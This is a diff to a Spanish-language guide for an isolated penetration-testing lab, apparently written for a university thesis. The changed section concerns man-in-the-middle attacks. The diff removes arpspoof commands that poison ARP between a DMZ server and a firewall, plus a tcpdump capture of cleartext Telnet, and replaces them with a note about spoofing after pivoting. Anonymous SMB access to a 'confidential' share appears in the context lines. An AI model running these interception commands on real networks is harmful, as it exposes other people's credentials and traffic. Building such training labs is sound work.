@@ -189,12 +189,7 @@ smbclient //192.168.58.10/confidential -N
 # Habilitar ip_forward en Kali para no cortar el tráfico
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# ARP Spoofing entre dmz-server y firewall
-arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
-arpspoof -i eth1 -t 192.168.57.1  192.168.57.10 &
-
-# Capturar tráfico Telnet en claro
-tcpdump -i eth1 -A port 23
+Opción B — Hacer el ARP spoof desde dmz-server tras pivoting (más realista para el escenario de TFG, demuestra escalada de privilegios).
 ```
 
 ### 5. Pivoting DMZ → red interna
@@ -212,4 +207,3 @@ smbclient //192.168.58.10/confidential -N
 Este laboratorio contiene configuraciones deliberadamente inseguras.
 Debe ejecutarse exclusivamente en el entorno aislado descrito. 
 Todos los datos son ficticios.
-```
